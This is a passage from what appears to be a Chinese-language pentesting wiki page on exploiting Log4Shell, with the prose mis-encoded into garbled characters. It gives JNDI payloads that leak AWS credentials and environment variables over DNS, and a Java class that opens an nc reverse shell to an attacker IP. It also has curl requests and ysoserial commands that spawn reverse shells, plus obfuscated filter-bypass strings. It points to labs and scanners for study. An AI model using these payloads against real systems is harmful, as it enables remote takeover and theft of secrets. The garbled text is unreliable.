<li><code>${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}</code>ï¼ˆä½¿ç”¨ <a href="https://canarytokens.org/generate">canarytokens.com</a>ï¼‰</li>
<li><code>${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}</code>ï¼ˆä½¿ç”¨ <a href="https://github.com/projectdiscovery/interactsh">interactsh</a>ï¼‰</li>
<li><code>${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}</code>ï¼ˆä½¿ç”¨ Burp Suiteï¼‰</li>
<li><code>${jndi:ldap://2j4ayo.dnslog.cn}</code>ï¼ˆä½¿ç”¨ <a href="http://dnslog.cn">dnslog</a>ï¼‰</li>
<li><code>${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}</code>ï¼ˆä½¿ç”¨ <a href="https://log4shell.huntress.com">huntress</a>ï¼‰</li>
</ul>
<p>è¯·æ³¨æ„ï¼Œ<strong>å³ä½¿æ”¶åˆ° DNS è¯·æ±‚ï¼Œä¹Ÿä¸æ„å‘³ç€åº”ç”¨ç¨‹åºæ˜¯å¯åˆ©ç”¨çš„</strong>ï¼ˆç”šè‡³ä¸è„†å¼±ï¼‰ï¼Œæ‚¨éœ€è¦å°è¯•åˆ©ç”¨å®ƒã€‚</p>
<p>{% hint style="info" %}
è¯·è®°ä½ï¼Œè¦ <strong>åˆ©ç”¨ç‰ˆæœ¬ 2.15</strong>ï¼Œæ‚¨éœ€è¦æ·»åŠ  <strong>localhost æ£€æŸ¥ç»•è¿‡</strong>ï¼š${jndi:ldap://<strong>127.0.0.1#</strong>...}
{% endhint %}</p>
<h4 id="æœ¬åœ°å‘ç°"><a class="header" href="#æœ¬åœ°å‘ç°"><strong>æœ¬åœ°å‘ç°</strong></a></h4>
<p>æœç´¢ <strong>æœ¬åœ°æ˜“å—æ”»å‡»ç‰ˆæœ¬</strong> çš„åº“ï¼š</p>
<pre><code class="language-bash">find / -name "log4j-core*.jar" 2&gt;/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
</code></pre>
<h3 id="éªŒè¯"><a class="header" href="#éªŒè¯"><strong>éªŒè¯</strong></a></h3>
<p>ä¹‹å‰åˆ—å‡ºçš„ä¸€äº›å¹³å°å°†å…è®¸æ‚¨æ’å…¥ä¸€äº›å˜é‡æ•°æ®ï¼Œè¿™äº›æ•°æ®å°†åœ¨è¯·æ±‚æ—¶è¢«è®°å½•ã€‚<br />
è¿™å¯¹äºä¸¤ä»¶äº‹éå¸¸æœ‰ç”¨ï¼š</p>
<ul>
<li><strong>éªŒè¯</strong> æ¼æ´</li>
<li><strong>åˆ©ç”¨</strong> æ¼æ´ <strong>æå–ä¿¡æ¯</strong></li>
</ul>
<p>ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ç±»ä¼¼äºï¼š<br />
æˆ–åƒ <code>${</code><strong><code>jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}</code></strong>ï¼Œå¦‚æœ <strong>æ¥æ”¶åˆ°çš„ DNS è¯·æ±‚åŒ…å«ç¯å¢ƒå˜é‡çš„å€¼</strong>ï¼Œæ‚¨å°±çŸ¥é“è¯¥åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ã€‚</p>
<p>æ‚¨å¯ä»¥å°è¯• <strong>æ³„éœ²</strong> çš„å…¶ä»–ä¿¡æ¯ï¼š</p>
<pre><code>${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
</code></pre>
<h3 id="rce-ä¿¡æ¯"><a class="header" href="#rce-ä¿¡æ¯">RCE ä¿¡æ¯</a></h3>
<p>{% hint style="info" %}
è¿è¡Œåœ¨ JDK ç‰ˆæœ¬é«˜äº 6u141ã€7u131 æˆ– 8u121 çš„ä¸»æœºå·²é’ˆå¯¹ LDAP ç±»åŠ è½½æ”»å‡»å‘é‡è¿›è¡Œäº†ä¿æŠ¤ã€‚è¿™æ˜¯ç”±äºé»˜è®¤ç¦ç”¨ <code>com.sun.jndi.ldap.object.trustURLCodebase</code>ï¼Œè¿™é˜²æ­¢äº† JNDI é€šè¿‡ LDAP åŠ è½½è¿œç¨‹ä»£ç åº“ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œè¿™äº›ç‰ˆæœ¬<strong>å¹¶æœªä¿æŠ¤å…å—ååºåˆ—åŒ–æ”»å‡»å‘é‡</strong>ã€‚</p>
<p>å¯¹äºæ—¨åœ¨åˆ©ç”¨è¿™äº›è¾ƒé«˜ JDK ç‰ˆæœ¬çš„æ”»å‡»è€…ï¼Œå¿…é¡»åœ¨ Java åº”ç”¨ç¨‹åºä¸­åˆ©ç”¨<strong>å—ä¿¡ä»»çš„å·¥å…·</strong>ã€‚åƒ ysoserial æˆ– JNDIExploit è¿™æ ·çš„å·¥å…·é€šå¸¸ç”¨äºæ­¤ç›®çš„ã€‚ç›¸åï¼Œåˆ©ç”¨è¾ƒä½çš„ JDK ç‰ˆæœ¬ç›¸å¯¹å®¹æ˜“ï¼Œå› ä¸ºè¿™äº›ç‰ˆæœ¬å¯ä»¥è¢«æ“çºµä»¥åŠ è½½å’Œæ‰§è¡Œä»»æ„ç±»ã€‚</p>
<p>æœ‰å…³<strong>æ›´å¤šä¿¡æ¯</strong>ï¼ˆ<em>ä¾‹å¦‚ RMI å’Œ CORBA å‘é‡çš„é™åˆ¶</em>ï¼‰ï¼Œ<strong>è¯·æŸ¥çœ‹ä¹‹å‰çš„ JNDI å‘½åå‚è€ƒéƒ¨åˆ†</strong>æˆ– <a href="https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/">https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/</a>
{% endhint %}</p>
<h3 id="rce---marshalsec-ä¸è‡ªå®šä¹‰æœ‰æ•ˆè´Ÿè½½"><a class="header" href="#rce---marshalsec-ä¸è‡ªå®šä¹‰æœ‰æ•ˆè´Ÿè½½">RCE - Marshalsec ä¸è‡ªå®šä¹‰æœ‰æ•ˆè´Ÿè½½</a></h3>
<p>æ‚¨å¯ä»¥åœ¨<strong>THM box</strong>ä¸­æµ‹è¯•æ­¤å†…å®¹ï¼š<a href="https://tryhackme.com/room/solar"><strong>https://tryhackme.com/room/solar</strong></a></p>
<p>ä½¿ç”¨å·¥å…· <a href="https://github.com/mbechler/marshalsec"><strong>marshalsec</strong></a>ï¼ˆjar ç‰ˆæœ¬å¯åœ¨ <a href="https://github.com/RandomRobbieBF/marshalsec-jar"><strong>è¿™é‡Œ</strong></a> è·å–ï¼‰ã€‚æ­¤æ–¹æ³•å»ºç«‹ä¸€ä¸ª LDAP å¼•ç”¨æœåŠ¡å™¨ï¼Œä»¥å°†è¿æ¥é‡å®šå‘åˆ°ä¸€ä¸ªæ¬¡çº§ HTTP æœåŠ¡å™¨ï¼Œåœ¨è¯¥æœåŠ¡å™¨ä¸Šå°†æ‰˜ç®¡æ¼æ´ï¼š</p>
<pre><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://&lt;your_ip_http_server&gt;:8000/#Exploit"
</code></pre>
<p>è¦æç¤ºç›®æ ‡åŠ è½½åå‘ shell ä»£ç ï¼Œåˆ¶ä½œä¸€ä¸ªåä¸º <code>Exploit.java</code> çš„ Java æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="language-java">public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
</code></pre>
<p>å°†Javaæ–‡ä»¶ç¼–è¯‘æˆç±»æ–‡ä»¶ï¼Œä½¿ç”¨ï¼š<code>javac Exploit.java -source 8 -target 8</code>ã€‚æ¥ä¸‹æ¥ï¼Œåœ¨åŒ…å«ç±»æ–‡ä»¶çš„ç›®å½•ä¸­å¯åŠ¨ä¸€ä¸ª<strong>HTTPæœåŠ¡å™¨</strong>ï¼Œä½¿ç”¨ï¼š<code>python3 -m http.server</code>ã€‚ç¡®ä¿<strong>marshalsec LDAPæœåŠ¡å™¨</strong>å¼•ç”¨æ­¤HTTPæœåŠ¡å™¨ã€‚</p>
<p>é€šè¿‡å‘é€ç±»ä¼¼çš„æœ‰æ•ˆè´Ÿè½½æ¥è§¦å‘åœ¨æ˜“å—æ”»å‡»çš„WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¼æ´ç±»ï¼š</p>
<pre><code class="language-bash">${jndi:ldap://&lt;LDAP_IP&gt;:1389/Exploit}
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> æ­¤æ¼æ´ä¾èµ–äºJavaçš„é…ç½®ï¼Œä»¥å…è®¸é€šè¿‡LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ã€‚å¦‚æœè¿™ä¸è¢«å…è®¸ï¼Œè¯·è€ƒè™‘åˆ©ç”¨å—ä¿¡ä»»çš„ç±»è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="rce---jndiexploit"><a class="header" href="#rce---jndiexploit">RCE - <strong>JNDIExploit</strong></a></h3>
<p>{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå‡ºäºæŸç§åŸå› ï¼Œä½œè€…åœ¨å‘ç°log4shellåå°†æ­¤é¡¹ç›®ä»githubä¸­åˆ é™¤ã€‚æ‚¨å¯ä»¥åœ¨<a href="https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2">https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2</a>æ‰¾åˆ°ç¼“å­˜ç‰ˆæœ¬ï¼Œä½†å¦‚æœæ‚¨æƒ³å°Šé‡ä½œè€…çš„å†³å®šï¼Œè¯·ä½¿ç”¨å…¶ä»–æ–¹æ³•æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚</p>
<p>æ­¤å¤–ï¼Œæ‚¨æ— æ³•åœ¨æ—¶å…‰æœºä¸­æ‰¾åˆ°æºä»£ç ï¼Œå› æ­¤è¦ä¹ˆåˆ†ææºä»£ç ï¼Œè¦ä¹ˆæ‰§è¡Œjaræ–‡ä»¶ï¼ŒçŸ¥é“æ‚¨ä¸çŸ¥é“è‡ªå·±åœ¨æ‰§è¡Œä»€ä¹ˆã€‚
{% endhint %}</p>
<p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥åœ¨8080ç«¯å£è¿è¡Œæ­¤<strong>æ˜“å—æ”»å‡»çš„webæœåŠ¡å™¨ä»¥è¿›è¡Œlog4shell</strong>ï¼š<a href="https://github.com/christophetd/log4shell-vulnerable-app">https://github.com/christophetd/log4shell-vulnerable-app</a>ï¼ˆ<em>åœ¨READMEä¸­æ‚¨å°†æ‰¾åˆ°å¦‚ä½•è¿è¡Œå®ƒ</em>ï¼‰ã€‚æ­¤æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä½¿ç”¨æ˜“å—æ”»å‡»çš„log4shellç‰ˆæœ¬è®°å½•HTTPè¯·æ±‚å¤´_X-Api-Version_çš„å†…å®¹ã€‚</p>
<p>ç„¶åï¼Œæ‚¨å¯ä»¥ä¸‹è½½<strong>JNDIExploit</strong> jaræ–‡ä»¶å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œå®ƒï¼š</p>
<pre><code class="language-bash">wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
</code></pre>
<p>åœ¨é˜…è¯»ä»£ç ä»…å‡ åˆ†é’Ÿåï¼Œåœ¨ <em>com.feihong.ldap.LdapServer</em> å’Œ <em>com.feihong.ldap.HTTPServer</em> ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ° <strong>LDAP å’Œ HTTP æœåŠ¡å™¨æ˜¯å¦‚ä½•åˆ›å»ºçš„</strong>ã€‚LDAP æœåŠ¡å™¨å°†ç†è§£éœ€è¦æä¾›çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶å°†å—å®³è€…é‡å®šå‘åˆ° HTTP æœåŠ¡å™¨ï¼Œåè€…å°†æä¾›æ¼æ´åˆ©ç”¨ã€‚<br />
åœ¨ <em>com.feihong.ldap.gadgets</em> ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ° <strong>ä¸€äº›ç‰¹å®šçš„å·¥å…·</strong>ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç ï¼‰ã€‚åœ¨ <em>com.feihong.ldap.template</em> ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¸åŒçš„æ¨¡æ¿ç±»ï¼Œè¿™äº›ç±»å°† <strong>ç”Ÿæˆæ¼æ´åˆ©ç”¨</strong>ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code></strong> æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¼æ´åˆ©ç”¨ã€‚ä¸€äº›æœ‰ç”¨çš„åŒ…æ‹¬ï¼š</p>
<pre><code class="language-bash">ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
</code></pre>
<p>æ‰€ä»¥ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†é‚£ä¸ªæ˜“å—æ”»å‡»çš„ Docker åº”ç”¨ç¨‹åºåœ¨è¿è¡Œã€‚è¦æ”»å‡»å®ƒï¼š</p>
<pre><code class="language-bash"># Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
</code></pre>
<p>åœ¨å‘é€æ”»å‡»æ—¶ï¼Œæ‚¨å°†åœ¨æ‰§è¡Œ <strong>JNDIExploit-1.2-SNAPSHOT.jar</strong> çš„ç»ˆç«¯ä¸­çœ‹åˆ°ä¸€äº›è¾“å‡ºã€‚</p>
<p><strong>è¯·è®°å¾—æ£€æŸ¥ <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code> ä»¥è·å–å…¶ä»–åˆ©ç”¨é€‰é¡¹ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦ï¼Œæ‚¨å¯ä»¥æ›´æ”¹ LDAP å’Œ HTTP æœåŠ¡å™¨çš„ç«¯å£ã€‚</strong></p>
<h3 id="rce---jndi-exploit-kit"><a class="header" href="#rce---jndi-exploit-kit">RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a></a></h3>
<p>ä¸ä¹‹å‰çš„åˆ©ç”¨æ–¹å¼ç±»ä¼¼ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ <a href="https://github.com/pimps/JNDI-Exploit-Kit"><strong>JNDI-Exploit-Kit</strong></a> æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚<br />
æ‚¨å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆè¦å‘é€ç»™å—å®³è€…çš„ URLï¼š</p>
<pre><code class="language-bash"># Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
</code></pre>
<p><em>è¿™ä¸ªæ”»å‡»ä½¿ç”¨è‡ªå®šä¹‰ç”Ÿæˆçš„javaå¯¹è±¡å°†åœ¨åƒ<strong>THM solar room</strong>è¿™æ ·çš„å®éªŒå®¤ä¸­æœ‰æ•ˆã€‚ç„¶è€Œï¼Œè¿™é€šå¸¸ä¸ä¼šæœ‰æ•ˆï¼ˆå› ä¸ºé»˜è®¤æƒ…å†µä¸‹Javaæœªé…ç½®ä¸ºä½¿ç”¨LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ï¼‰ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºå®ƒæ²¡æœ‰æ»¥ç”¨å—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</em></p>
<h3 id="rce---jndi-injection-exploit-plus"><a class="header" href="#rce---jndi-injection-exploit-plus">RCE - JNDI-Injection-Exploit-Plus</a></h3>
<p><a href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus</a> æ˜¯å¦ä¸€ä¸ªç”Ÿæˆ<strong>å¯ç”¨JNDIé“¾æ¥</strong>çš„å·¥å…·ï¼Œå¹¶é€šè¿‡å¯åŠ¨RMIæœåŠ¡å™¨ã€LDAPæœåŠ¡å™¨å’ŒHTTPæœåŠ¡å™¨æä¾›åå°æœåŠ¡ã€‚</p>
<h3 id="rce---ysoserial--jndi-exploit-kit"><a class="header" href="#rce---ysoserial--jndi-exploit-kit">RCE - ysoserial &amp; JNDI-Exploit-Kit</a></h3>
<p>è¿™ä¸ªé€‰é¡¹å¯¹äºæ”»å‡»<strong>ä»…ä¿¡ä»»æŒ‡å®šç±»è€Œä¸æ˜¯æ‰€æœ‰ç±»çš„Javaç‰ˆæœ¬</strong>éå¸¸æœ‰ç”¨ã€‚å› æ­¤ï¼Œ<strong>ysoserial</strong>å°†ç”¨äºç”Ÿæˆ<strong>å—ä¿¡ä»»ç±»çš„åºåˆ—åŒ–</strong>ï¼Œè¿™äº›åºåˆ—åŒ–å¯ä»¥ä½œä¸ºå°å·¥å…·æ¥<strong>æ‰§è¡Œä»»æ„ä»£ç </strong>ï¼ˆ<em>ysoserialæ»¥ç”¨çš„å—ä¿¡ä»»ç±»å¿…é¡»è¢«å—å®³è€…çš„javaç¨‹åºä½¿ç”¨ï¼Œä»¥ä¾¿åˆ©ç”¨èƒ½å¤Ÿç”Ÿæ•ˆ</em>ï¼‰ã€‚</p>
<p>ä½¿ç”¨<strong>ysoserial</strong>æˆ–<a href="https://github.com/pimps/ysoserial-modified"><strong>ysoserial-modified</strong></a>ï¼Œæ‚¨å¯ä»¥åˆ›å»ºå°†è¢«JNDIä¸‹è½½çš„ååºåˆ—åŒ–åˆ©ç”¨ï¼š</p>
<pre><code class="language-bash"># Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/7878 0&gt;&amp;1' &gt; /tmp/cc5.ser
</code></pre>
<p>ä½¿ç”¨ <a href="https://github.com/pimps/JNDI-Exploit-Kit"><strong>JNDI-Exploit-Kit</strong></a> ç”Ÿæˆ <strong>JNDI é“¾æ¥</strong>ï¼Œå…¶ä¸­æ¼æ´å°†ç­‰å¾…æ¥è‡ªæ˜“å—æ”»å‡»æœºå™¨çš„è¿æ¥ã€‚æ‚¨å¯ä»¥æä¾› <strong>ä¸åŒçš„åˆ©ç”¨ç¨‹åºï¼Œè¿™äº›åˆ©ç”¨ç¨‹åºå¯ä»¥ç”± JNDI-Exploit-Kit è‡ªåŠ¨ç”Ÿæˆ</strong>ï¼Œç”šè‡³æ˜¯æ‚¨ <strong>è‡ªå·±çš„ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½</strong>ï¼ˆç”±æ‚¨æˆ– ysoserial ç”Ÿæˆï¼‰ã€‚</p>
<pre><code class="language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
</code></pre>
<p><img src="../../.gitbook/assets/image%20(1118).png" alt="" /></p>
<p>ç°åœ¨æ‚¨å¯ä»¥è½»æ¾åœ°ä½¿ç”¨ç”Ÿæˆçš„ JNDI é“¾æ¥æ¥åˆ©ç”¨è¯¥æ¼æ´å¹¶è·å¾—ä¸€ä¸ª <strong>reverse shell</strong>ï¼Œåªéœ€å‘é€åˆ°ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ log4j ç‰ˆæœ¬ï¼š<strong><code>${ldap://10.10.14.10:1389/generated}</code></strong></p>
<h3 id="ç»•è¿‡æ–¹æ³•"><a class="header" href="#ç»•è¿‡æ–¹æ³•">ç»•è¿‡æ–¹æ³•</a></h3>
<pre><code class="language-java">${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
</code></pre>
<h3 id="è‡ªåŠ¨æ‰«æå™¨"><a class="header" href="#è‡ªåŠ¨æ‰«æå™¨">è‡ªåŠ¨æ‰«æå™¨</a></h3>
<ul>
<li><a href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a></li>
<li><a href="https://github.com/adilsoybali/Log4j-RCE-Scanner">https://github.com/adilsoybali/Log4j-RCE-Scanner</a></li>
<li><a href="https://github.com/silentsignal/burp-log4shell">https://github.com/silentsignal/burp-log4shell</a></li>
<li><a href="https://github.com/cisagov/log4j-scanner">https://github.com/cisagov/log4j-scanner</a></li>
<li><a href="https://github.com/Qualys/log4jscanwin">https://github.com/Qualys/log4jscanwin</a></li>
<li><a href="https://github.com/hillu/local-log4j-vuln-scanner">https://github.com/hillu/local-log4j-vuln-scanner</a></li>
<li><a href="https://github.com/logpresso/CVE-2021-44228-Scanner">https://github.com/logpresso/CVE-2021-44228-Scanner</a></li>
<li><a href="https://github.com/palantir/log4j-sniffer">https://github.com/palantir/log4j-sniffer</a> - æŸ¥æ‰¾æœ¬åœ°æ˜“å—æ”»å‡»çš„åº“</li>
</ul>
<h3 id="æµ‹è¯•å®éªŒå®¤"><a class="header" href="#æµ‹è¯•å®éªŒå®¤">æµ‹è¯•å®éªŒå®¤</a></h3>
<ul>
<li><a href="https://app.hackthebox.com/tracks/UHC-track"><strong>LogForge HTB æœºå™¨</strong></a></li>
<li><a href="https://tryhackme.com/room/solar"><strong>Try Hack Me Solar æˆ¿é—´</strong></a></li>
<li><a href="https://github.com/leonjza/log4jpwn"><strong>https://github.com/leonjza/log4jpwn</strong></a></li>
<li><a href="https://github.com/christophetd/log4shell-vulnerable-app"><strong>https://github.com/christophetd/log4shell-vulnerable-app</strong></a></li>
</ul>
<h2 id="log4shell-ååˆ©ç”¨"><a class="header" href="#log4shell-ååˆ©ç”¨">Log4Shell ååˆ©ç”¨</a></h2>
<p>åœ¨è¿™ç¯‡ <a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/"><strong>CTF æ–‡ç« </strong></a> ä¸­å¾ˆå¥½åœ°è§£é‡Šäº†å¦‚ä½• <strong>å¯èƒ½</strong> <strong>æ»¥ç”¨</strong> <strong>Log4J</strong> çš„æŸäº›åŠŸèƒ½ã€‚</p>
<p>Log4j çš„ <a href="https://logging.apache.org/log4j/2.x/security.html"><strong>å®‰å…¨é¡µé¢</strong></a> æœ‰ä¸€äº›æœ‰è¶£çš„å¥å­ï¼š</p>
<blockquote>
<p>ä»ç‰ˆæœ¬ 2.16.0ï¼ˆå¯¹äº Java 8ï¼‰å¼€å§‹ï¼Œ<strong>æ¶ˆæ¯æŸ¥æ‰¾åŠŸèƒ½å·²è¢«å®Œå…¨ç§»é™¤</strong>ã€‚<strong>é…ç½®ä¸­çš„æŸ¥æ‰¾ä»ç„¶æœ‰æ•ˆ</strong>ã€‚æ­¤å¤–ï¼ŒLog4j ç°åœ¨é»˜è®¤ç¦ç”¨å¯¹ JNDI çš„è®¿é—®ã€‚é…ç½®ä¸­çš„ JNDI æŸ¥æ‰¾ç°åœ¨éœ€è¦æ˜¾å¼å¯ç”¨ã€‚</p>
</blockquote>
<blockquote>
<p>ä»ç‰ˆæœ¬ 2.17.0ï¼ˆä»¥åŠ Java 7 å’Œ Java 6 çš„ 2.12.3 å’Œ 2.3.1ï¼‰å¼€å§‹ï¼Œ<strong>ä»…é…ç½®ä¸­çš„æŸ¥æ‰¾å­—ç¬¦ä¸²ä¼šé€’å½’å±•å¼€</strong>ï¼›åœ¨ä»»ä½•å…¶ä»–ç”¨æ³•ä¸­ï¼Œä»…è§£æé¡¶çº§æŸ¥æ‰¾ï¼Œä»»ä½•åµŒå¥—æŸ¥æ‰¾éƒ½ä¸ä¼šè¢«è§£æã€‚</p>
</blockquote>
<p>è¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ <strong>å¿˜è®°ä½¿ç”¨ä»»ä½• <code>jndi</code> æ¼æ´</strong>ã€‚æ­¤å¤–ï¼Œè¦æ‰§è¡Œ <strong>é€’å½’æŸ¥æ‰¾</strong>ï¼Œæ‚¨éœ€è¦è¿›è¡Œé…ç½®ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨è¯¥ CTF ä¸­ï¼Œè¿™åœ¨æ–‡ä»¶ log4j2.xml ä¸­è¿›è¡Œäº†é…ç½®ï¼š</p>
<pre><code class="language-xml">&lt;Console name="Console" target="SYSTEM_ERR"&gt;
&lt;PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n"&gt;
&lt;/PatternLayout&gt;
&lt;/Console&gt;
</code></pre>
<h3 id="env-lookups"><a class="header" href="#env-lookups">Env Lookups</a></h3>
<p>åœ¨ <a href="https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/">è¿™ä¸ª CTF</a> ä¸­ï¼Œæ”»å‡»è€…æ§åˆ¶äº† <code>${sys:cmd}</code> çš„å€¼ï¼Œå¹¶éœ€è¦ä»ç¯å¢ƒå˜é‡ä¸­æå–æ ‡å¿—ã€‚<br />
å¦‚åœ¨ <a href="jndi-java-naming-and-directory-interface-and-log4shell.html#verification"><strong>ä¹‹å‰çš„æœ‰æ•ˆè½½è·</strong></a> é¡µé¢ä¸­æ‰€è§ï¼Œæœ‰å‡ ç§è®¿é—®ç¯å¢ƒå˜é‡çš„æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š<strong><code>${env:FLAG}</code></strong>ã€‚åœ¨è¿™ä¸ª CTF ä¸­è¿™æ²¡æœ‰ç”¨ï¼Œä½†åœ¨å…¶ä»–ç°å®åœºæ™¯ä¸­å¯èƒ½ä¼šæœ‰ç”¨ã€‚</p>
<h3 id="exfiltration-in-exceptions"><a class="header" href="#exfiltration-in-exceptions">Exfiltration in Exceptions</a></h3>
